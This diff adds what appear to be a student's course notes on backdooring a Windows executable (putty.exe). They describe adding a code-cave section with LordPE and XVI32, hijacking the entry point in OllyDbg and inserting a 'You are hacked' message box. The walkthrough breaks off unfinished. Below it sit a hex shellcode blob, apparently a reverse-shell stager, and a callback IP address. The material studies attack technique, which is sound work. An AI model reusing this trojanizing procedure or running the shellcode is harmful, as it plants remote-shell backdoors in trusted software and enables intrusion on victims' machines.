@@ -1,0 +1,79 @@
+PE CODE INJECTION
+- Open LordPE
+- PE Editor-> select executable you want to change-> open 'Sections'
+- Right click the last section in the Sections and select: 'add section header'
+- this new section can be double clicked and edited- edit the name and change both the raw and virtual size to 00005000 (make sure there are 8digits for hexadecimal)
+- select 'ok' then 'save' the changed file then select 'ok'
+- now the file header size is changed but it does not match the file description. For that we use XVI32
+- open XVI32
+- open the changed PE1.exe
+- go to the last byte
+- edit-> insert string-> Hex-String- '00' -> number of times-5000 -> click 'ok'
+- save
+- File->exit- now we have added 5000 bytes to the executable
+- now the error is gone: header and file size matches
+
+-open OllyDbg and open the new PE1.exe
+- 55: PUSH; C3: RETURN - These codes are commonly seen in the start and end of a subroutine in Assembly
+- Click 'M' to see the memory map
+- Find the part that is Labled with '.Shreeya' which is our added section and right click and copy it's address. In my case it is 00522000 - this is the addess of the code Cave.
+- click Window-> select the main CPU thread to return back to the original place
+- copy the first 4 bytes from the CALL instruction of the original Entry point and store it in a notepad.
+- press space in the call and write "jmp <code cave address>"- this changed the colour to red
+- only the call instruction ie the 1st line is changed
+- select that line and right click-> copy to executable-> selection
+- this opens a new window -> right click anywhere and select -> save file -> name: PE_2
+- this new PE_2 does not open on double clicking- because there is nothing at the jump instruction address.
+
+-Open OllyDBG and open the new PE2
+- press Fn+F7 to move to the address where the newly added header just started which should be at 00522000 - as mentioned before
+- select a big portion starting from this address and move down.
+- Right click and fill this huge portion with NOPs by : right click-> binary-> fill with NOPs
+- Save this file with the same name as before ie PE2
+- to reload Ollydbg go to Debug-> Restart 
+- select F7 and you will see the NOPs as inserted at 522000 earlier
+
+- now we want to invoke a message box for this we need to know the structure of MessageBoxA which is an important question even for Exams
+- int MessageBoxA(
+  [in, optional] HWND   hWnd,
+  [in, optional] LPCSTR lpText,
+  [in, optional] LPCSTR lpCaption,
+  [in]           UINT   uType
+);
+
+
+- Now in the edited PE2 we leave some space from 522000 and select a big chunk of bytes
+- Right click and select Binary-> edit
+- In the pop up box select the ASCII field and enter a string like "You are hacked" or something.
+- then a ASSEMBLY code is inserted in that place.
+- Copy the address to the first line of that inserted code as it is from where we will enter our message dialogue box(Add1)
+- then go to the top(522000) and pass the parameters to the MessageBoxA by:
+	- right click-> assemble-> push 0
+	- right click-> assemble-> push <address of the dialoge box(Add1)> 
+	- right click-> assemble-> push <address of the dialogue box(Add1)> {you can have some other string and inster that address here}
+	- right click-> assemble-> push 0 
+	- all parameters have now been passed to the stack so now we need to call the message box
+	- go to next line
+	- right click-> assemble-> call MessageBoxA
+- now select all these changed part -> right click-> copy to the executable
+- box will pop up-> right click-> save file as 'PE_3'
+
+- Now we need to connect it to the original file so that after we click 'OK' we return to the original running of the putty.exe
+- from the saved
+
+
+
+
+192.168.184.128
+
+fce88f0000006031d2648b523089e58b520c8b52148b722831ff0fb74a2631c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b48188b582001d35085c9743c31ff498b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a0b5950e2fd6a016a0268ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd585c00f85580000005768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd583f8007e2d8b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007e0701c329c675e9c3bbf0b5a2566a0053ffd5
+
+OEP:
+00475CA0 > $ E8 9A020000    CALL putty.00475F3F
+00475CA5   .^E9 84FEFFFF    JMP putty.00475B2E
+00475CAA  /$ 55             PUSH EBP
+00475CAB  |. 8BEC           MOV EBP,ESP
+
+
+
+
